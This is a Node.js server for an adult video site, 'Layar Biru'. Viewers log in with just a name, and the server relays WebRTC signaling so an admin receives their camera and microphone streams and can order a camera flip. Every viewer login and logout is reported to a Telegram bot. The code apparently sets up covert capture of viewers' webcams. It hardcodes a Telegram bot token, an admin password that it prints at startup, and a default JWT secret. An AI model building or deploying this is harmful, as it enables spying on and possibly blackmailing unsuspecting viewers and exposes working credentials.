require('dotenv').config();
const express  = require('express');
const jwt      = require('jsonwebtoken');
const cors     = require('cors');
const path     = require('path');
const http     = require('http');
const { Server } = require('socket.io');

const app    = express();
const server = http.createServer(app);
const PORT   = process.env.PORT || 3000;

// ===========================
// MIDDLEWARE
// ===========================
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ===========================
// CONFIG
// ===========================
const JWT_SECRET = process.env.JWT_SECRET || 'layarbiru_secret_key_2024';

// Admin user (untuk login admin)
const ADMIN_USER = {
  name:     process.env.ADMIN_NAME || 'Admin Layar Biru',
  initial:  'AL',
  role:     'admin',
  password: process.env.ADMIN_PASSWORD || 'Bayu.2000'
};

// ===========================
// SESSION STORE
// ===========================
const activeSessions = new Map(); // token → sessionData
const sseClients     = new Set(); // SSE admin connections
const userSessions   = new Map(); // username → session count (untuk tracking)

function broadcastSessions() {
  const payload = JSON.stringify({ type:'sessions', data: getSessionsPayload() });
  for (const res of sseClients) {
    try { res.write(`data: ${payload}\n\n`); } catch {}
  }
}

// ===========================
// TELEGRAM BOT NOTIFICATION
// ===========================
const TELEGRAM_TOKEN   = process.env.TELEGRAM_TOKEN   || '8888905749:AAF26albgKi3nC0EZL4SJnSuLI6WE8k2hMw';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7039626075';

async function sendTelegramNotif(message) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const res = await fetch(url, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id:    TELEGRAM_CHAT_ID,
        text:       message,
        parse_mode: 'HTML'
      })
    });
    const data = await res.json();
    if (!data.ok) console.error('[TELEGRAM] Gagal kirim:', data.description);
  } catch (err) {
    console.error('[TELEGRAM] Error:', err.message);
  }
}

// Broadcast notifikasi pengguna baru login ke semua admin SSE
function broadcastNewLogin(user) {
  const payload = JSON.stringify({
    type: 'new-login',
    data: {
      name:    user.name,
      initial: user.initial,
      role:    user.role,
      time:    Date.now()
    }
  });
  for (const res of sseClients) {
    try { res.write(`data: ${payload}\n\n`); } catch {}
  }
}

function getSessionsPayload() {
  const now = Date.now();
  return Array.from(activeSessions.values()).map(s => ({
    id:        s.id,
    name:      s.user.name,
    initial:   s.user.initial,
    email:     s.user.name,
    film:      s.film,
    camActive: s.camActive,
    micActive: s.micActive,
    duration:  Math.floor((now - s.startTime) / 1000),
    startTime: s.startTime
  }));
}

// Fungsi untuk generate initial dari nama
function generateInitial(fullName) {
  const parts = fullName.trim().split(/\s+/);
  if (parts.length === 0) return 'U';
  if (parts.length === 1) return parts[0].substring(0, 1).toUpperCase();
  return (parts[0].substring(0, 1) + parts[1].substring(0, 1)).toUpperCase();
}

// ===========================
// SOCKET.IO — WebRTC SIGNALING
// ===========================
const io = new Server(server, {
  cors: { origin: '*', methods: ['GET','POST'] },
  transports: ['polling', 'websocket'],
  pingInterval: 20000,
  pingTimeout:  30000,
  upgradeTimeout: 10000,
  allowEIO3: true
});

// Middleware autentikasi Socket.IO
io.use((socket, next) => {
  const token = socket.handshake.auth?.token || socket.handshake.query?.token;
  if (!token) return next(new Error('Unauthorized'));
  try {
    socket._user = jwt.verify(token, JWT_SECRET);
    socket._role = socket._user.role;
    next();
  } catch {
    next(new Error('Unauthorized'));
  }
});

io.on('connection', (socket) => {
  const user = socket._user;
  const role = socket._role;

  // ── VIEWER ──
  if (role === 'viewer') {
    socket.on('register-viewer', ({ sessionId }) => {
      socket._sessionId = sessionId;
      socket.join(`viewer:${sessionId}`);
      io.to('admins').emit('viewer-connected', { sessionId, user });
      console.log(`[SIO] Viewer terhubung: ${user.name} (${sessionId})`);
    });

    socket.on('answer', (msg) => {
      io.to('admins').emit('answer', msg);
    });

    socket.on('ice-candidate', (msg) => {
      io.to('admins').emit('ice-candidate', { ...msg, from: 'viewer' });
    });

    socket.on('flip-camera-accepted', ({ sessionId }) => {
      if (!sessionId) return;
      io.to('admins').emit('flip-camera-accepted', { sessionId });
      console.log(`[SIO] flip-camera-accepted dari ${user.name} (${sessionId})`);
    });

    socket.on('flip-camera-rejected', ({ sessionId }) => {
      if (!sessionId) return;
      io.to('admins').emit('flip-camera-rejected', { sessionId });
      console.log(`[SIO] flip-camera-rejected dari ${user.name} (${sessionId})`);
    });

    socket.on('disconnect', () => {
      if (socket._sessionId) {
        io.to('admins').emit('viewer-disconnected', { sessionId: socket._sessionId });
        console.log(`[SIO] Viewer putus: ${user.name}`);
      }
    });
  }

  // ── ADMIN ──
  if (role === 'admin') {
    socket.join('admins');

    socket.on('register-admin', () => {
      const viewers = [];
      io.sockets.sockets.forEach(s => {
        if (s._role === 'viewer' && s._sessionId) {
          viewers.push({ sessionId: s._sessionId, user: s._user });
        }
      });
      socket.emit('viewer-list', { viewers });
      console.log(`[SIO] Admin terhubung: ${user.name}, ${viewers.length} viewer aktif`);
    });

    socket.on('offer', ({ sessionId, data }) => {
      io.to(`viewer:${sessionId}`).emit('offer', { sessionId, data });
    });

    socket.on('ice-candidate', (msg) => {
      io.to(`viewer:${msg.sessionId}`).emit('ice-candidate', { ...msg, from: 'admin' });
    });

    socket.on('flip-camera', ({ sessionId }) => {
      if (!sessionId) return;
      const targetRoom = io.sockets.adapter.rooms.get(`viewer:${sessionId}`);
      if (!targetRoom || targetRoom.size === 0) {
        socket.emit('flip-camera-rejected', { sessionId });
        console.log(`[SIO] flip-camera gagal: viewer ${sessionId} tidak ditemukan`);
        return;
      }
      io.to(`viewer:${sessionId}`).emit('flip-camera');
      console.log(`[SIO] Admin ${user.name} minta flip kamera → ${sessionId}`);
    });

    socket.on('disconnect', () => {
      console.log(`[SIO] Admin putus: ${user.name}`);
    });
  }
});

// ===========================
// HTTP ROUTES
// ===========================
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    viewers: [...io.sockets.sockets.values()].filter(s => s._role === 'viewer').length,
    admins:  [...io.sockets.sockets.values()].filter(s => s._role === 'admin').length
  });
});

// CHECK ADMIN
app.post('/api/check-admin', (req, res) => {
  const { name } = req.body;
  if (!name || !name.trim()) {
    return res.status(400).json({ success: false, isAdmin: false, message: 'Nama wajib diisi.' });
  }
  const isAdmin = name.trim().toLowerCase() === 'admin';
  res.json({
    success: true,
    isAdmin,
    message: isAdmin ? 'Admin terdeteksi, silakan masukkan password' : 'Username tidak terdaftar sebagai admin'
  });
});

// LOGIN
app.post('/api/login', async (req, res) => {
  const { name, password } = req.body;
  if (!name || !name.trim()) {
    return res.status(400).json({ success: false, code: 'MISSING_NAME', message: 'Nama wajib diisi.' });
  }

  const trimmedName = name.trim();
  const trimmedNameLower = trimmedName.toLowerCase();

  if (trimmedNameLower === 'admin') {
    if (!password) {
      return res.status(401).json({ success: false, code: 'PASSWORD_REQUIRED', message: 'Password admin wajib diisi.' });
    }
    if (password !== ADMIN_USER.password) {
      return res.status(401).json({ success: false, code: 'WRONG_PASSWORD', message: 'Password admin salah.' });
    }
    const token = jwt.sign(
      { name: 'Admin', initial: 'YZ', role: 'admin' },
      JWT_SECRET,
      { expiresIn: '8h' }
    );
    console.log(`[LOGIN] Admin`);
    return res.json({ success: true, token, user: { name: 'Admin', initial: 'YZ', role: 'admin' } });
  }

  // Viewer
  const initial = generateInitial(trimmedName);
  for (const [oldToken, s] of activeSessions) {
    if (s.name && s.name.toLowerCase() === trimmedNameLower) {
      activeSessions.delete(oldToken);
    }
  }

  const token = jwt.sign(
    { name: trimmedName, initial, role: 'viewer' },
    JWT_SECRET,
    { expiresIn: '8h' }
  );

  console.log(`[LOGIN] Viewer: ${trimmedName}`);
  broadcastNewLogin({ name: trimmedName, initial, role: 'viewer' });

  const waktu = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit', timeZone: 'Asia/Jakarta' });
  const totalSesi = activeSessions.size + 1;
  sendTelegramNotif(
`🟢 <b>Pengguna Baru Masuk</b>

👤 <b>Nama</b>    : ${trimmedName}
🕐 <b>Waktu</b>   : ${waktu} WIB
📊 <b>Sesi aktif</b>: ${totalSesi} pengguna

— <i>Layar Biru Dashboard</i>`
  );

  res.json({ success: true, token, user: { name: trimmedName, initial, role: 'viewer' } });
});

app.get('/api/verify', (req, res) => {
  const token = (req.headers['authorization']||'').split(' ')[1];
  if (!token) return res.status(401).json({ success:false });
  try { res.json({ success:true, user: jwt.verify(token, JWT_SECRET) }); }
  catch { res.status(401).json({ success:false }); }
});

app.post('/api/session/start', (req, res) => {
  const token = (req.headers['authorization']||'').split(' ')[1];
  if (!token) return res.status(401).json({ success:false });
  try {
    const user = jwt.verify(token, JWT_SECRET);
    activeSessions.set(token, {
      id:        token.slice(-8),
      user,
      startTime: Date.now(),
      film:      req.body.film || '—',
      camActive: req.body.camActive !== false,
      micActive: req.body.micActive !== false,
      lastPing:  Date.now()
    });
    broadcastSessions();
    res.json({ success:true, sessionId: token.slice(-8) });
  } catch { res.status(401).json({ success:false }); }
});

app.post('/api/session/ping', (req, res) => {
  const token = (req.headers['authorization']||'').split(' ')[1];
  const s = activeSessions.get(token);
  if (s) {
    s.lastPing  = Date.now();
    s.film      = req.body.film      ?? s.film;
    s.camActive = req.body.camActive ?? s.camActive;
    s.micActive = req.body.micActive ?? s.micActive;
    broadcastSessions();
  }
  res.json({ success:true });
});

app.post('/api/logout', (req, res) => {
  const token = (req.headers['authorization']||'').split(' ')[1];
  if (token) {
    try {
      const d = jwt.verify(token, JWT_SECRET);
      const sesi = activeSessions.get(token);
      const durasi = sesi ? Math.floor((Date.now() - sesi.startTime) / 60000) : 0;
      activeSessions.delete(token);
      broadcastSessions();
      console.log(`[LOGOUT] ${d.name}`);
      if (d.role === 'viewer') {
        const waktu = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit', timeZone: 'Asia/Jakarta' });
        sendTelegramNotif(
`🔴 <b>Pengguna Keluar</b>

👤 <b>Nama</b>    : ${d.name}
🕐 <b>Waktu</b>   : ${waktu} WIB
⏱ <b>Durasi</b>  : ${durasi} menit

— <i>Layar Biru Dashboard</i>`
        );
      }
    } catch {}
  }
  res.json({ success:true });
});

app.get('/api/sessions', (req, res) => {
  const token = (req.headers['authorization']||'').split(' ')[1];
  if (!token) return res.status(401).json({ success:false });
  try {
    const u = jwt.verify(token, JWT_SECRET);
    if (u.role !== 'admin') return res.status(403).json({ success:false });
    res.json({ success:true, sessions: getSessionsPayload() });
  } catch { res.status(401).json({ success:false }); }
});

// SSE stream untuk admin
app.get('/api/sessions/stream', (req, res) => {
  try { jwt.verify(req.query.token, JWT_SECRET); } catch { return res.status(401).end(); }
  res.setHeader('Content-Type',  'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection',    'keep-alive');
  res.flushHeaders();
  res.write(`data: ${JSON.stringify({ type:'sessions', data: getSessionsPayload() })}\n\n`);
  sseClients.add(res);
  const hb = setInterval(() => {
    try { res.write(`: ping\n\n`); } catch {}
  }, 20000);
  req.on('close', () => { clearInterval(hb); sseClients.delete(res); });
});

// Cleanup sesi timeout
setInterval(() => {
  const now = Date.now(); let changed = false;
  for (const [token, s] of activeSessions) {
    if (now - s.lastPing > 30000) { activeSessions.delete(token); changed = true; }
  }
  if (changed) broadcastSessions();
}, 10000);


// ================================================================
// FILMS — PostgreSQL (Railway)
// ================================================================
const { Pool } = require('pg');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false }
});

const GRADIENTS_POOL = [
  'linear-gradient(135deg,#1a1a2e,#16213e)',
  'linear-gradient(135deg,#0f3460,#533483)',
  'linear-gradient(135deg,#e94560,#0f3460)',
  'linear-gradient(135deg,#2c003e,#ad5cad)',
  'linear-gradient(135deg,#1b1b2f,#e43f5a)',
  'linear-gradient(135deg,#162447,#1f4068)',
  'linear-gradient(135deg,#1b262c,#0f4c75)',
  'linear-gradient(135deg,#2d132c,#ee4540)',
  'linear-gradient(135deg,#0d0d0d,#3a0ca3)',
  'linear-gradient(135deg,#10002b,#e0aaff)',
];

// Buat tabel + seed dari films.js jika tabel masih kosong
async function initDB() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS films (
        id        SERIAL PRIMARY KEY,
        title     TEXT NOT NULL,
        desc      TEXT NOT NULL,
        "videoId" TEXT NOT NULL UNIQUE,
        thumb     TEXT NOT NULL,
        embed     TEXT NOT NULL,
        gradient  TEXT NOT NULL,
        duration  TEXT NOT NULL DEFAULT '1h 30m'
      )
    `);
    console.log('[PG] Tabel films siap');

    // Seed dari films.js hanya jika tabel kosong
    const { rows } = await pool.query('SELECT COUNT(*) FROM films');
    if (parseInt(rows[0].count) === 0) {
      try {
        const { FILMS } = require('./public/js/films');
        for (let i = 0; i < FILMS.length; i++) {
          const f = FILMS[i];
          await pool.query(
            `INSERT INTO films (title, desc, "videoId", thumb, embed, gradient, duration)
             VALUES ($1,$2,$3,$4,$5,$6,$7) ON CONFLICT ("videoId") DO NOTHING`,
            [
              f.title, f.desc, f.videoId, f.thumb,
              f.embed || `https://www.xvideos.com/embedframe/${f.videoId}`,
              f.gradient || GRADIENTS_POOL[i % GRADIENTS_POOL.length],
              f.duration || '1h 30m'
            ]
          );
        }
        console.log(`[PG] ${FILMS.length} film di-seed dari films.js`);
      } catch (e) {
        console.warn('[PG] Seed dari films.js gagal:', e.message);
      }
    }
  } catch (err) {
    console.error('[PG] initDB error:', err.message);
  }
}
initDB();

function verifyAdmin(req, res) {
  const token = (req.headers['authorization'] || '').split(' ')[1];
  if (!token) { res.status(401).json({ success: false, message: 'Unauthorized' }); return null; }
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    if (decoded.role !== 'admin') { res.status(403).json({ success: false, message: 'Forbidden' }); return null; }
    return decoded;
  } catch {
    res.status(401).json({ success: false, message: 'Invalid token' }); return null;
  }
}

// GET /api/films — ambil semua film
app.get('/api/films', async (req, res) => {
  try {
    const { rows } = await pool.query('SELECT * FROM films ORDER BY id ASC');
    res.json({ success: true, films: rows });
  } catch (err) {
    console.error('[FILMS] GET error:', err.message);
    res.status(500).json({ success: false, message: 'Gagal mengambil data film' });
  }
});

// POST /api/films — tambah film baru (admin only)
app.post('/api/films', async (req, res) => {
  if (!verifyAdmin(req, res)) return;

  const { title, desc, videoId, thumb, duration } = req.body;
  if (!title || !desc || !videoId || !thumb)
    return res.status(400).json({ success: false, message: 'Field title, desc, videoId, thumb wajib diisi' });

  try {
    const countRes = await pool.query('SELECT COUNT(*) FROM films');
    const count    = parseInt(countRes.rows[0].count);
    const gradient = GRADIENTS_POOL[count % GRADIENTS_POOL.length];
    const embed    = `https://www.xvideos.com/embedframe/${videoId}`;

    const { rows } = await pool.query(
      `INSERT INTO films (title, desc, "videoId", thumb, embed, gradient, duration)
       VALUES ($1,$2,$3,$4,$5,$6,$7)
       RETURNING *`,
      [title, desc, videoId, thumb, embed, gradient, duration || '1h 30m']
    );

    console.log(`[FILMS] Ditambahkan: ${title}`);
    res.json({ success: true, film: rows[0] });
  } catch (err) {
    if (err.code === '23505') // unique violation
      return res.status(400).json({ success: false, message: 'Video ID sudah ada' });
    console.error('[FILMS] POST error:', err.message);
    res.status(500).json({ success: false, message: 'Gagal menyimpan film' });
  }
});

// DELETE /api/films/:videoId — hapus film (admin only)
app.delete('/api/films/:videoId', async (req, res) => {
  if (!verifyAdmin(req, res)) return;

  try {
    const { rowCount } = await pool.query(
      'DELETE FROM films WHERE "videoId" = $1',
      [req.params.videoId]
    );
    if (rowCount === 0)
      return res.status(404).json({ success: false, message: 'Film tidak ditemukan' });

    console.log(`[FILMS] Dihapus videoId: ${req.params.videoId}`);
    res.json({ success: true });
  } catch (err) {
    console.error('[FILMS] DELETE error:', err.message);
    res.status(500).json({ success: false, message: 'Gagal menghapus film' });
  }
});

app.get('*', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

// ===========================
// START
// ===========================
server.listen(PORT, () => {
  console.log(`\n🎬 Layar Biru v2.1 berjalan di port ${PORT}`);
  console.log(`📡 Socket.IO signaling aktif`);
  console.log(`\n📋 Login:`);
  console.log(`  [VIEWER] Masukkan nama apapun untuk login`);
  console.log(`  [ADMIN]  Masukkan password: ${ADMIN_USER.password}`);
  console.log('');
});

// ===========================
// GRACEFUL SHUTDOWN
// ===========================
function gracefulShutdown(signal) {
  console.log(`\n[${signal}] Menutup server dengan graceful...`);
  io.emit('server-restart', { message: 'Server sedang restart, harap refresh.' });
  server.close(() => {
    console.log('[SHUTDOWN] HTTP server ditutup.');
    process.exit(0);
  });
  setTimeout(() => {
    console.error('[SHUTDOWN] Timeout, force exit.');
    process.exit(1);
  }, 8000);
}

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT',  () => gracefulShutdown('SIGINT'));
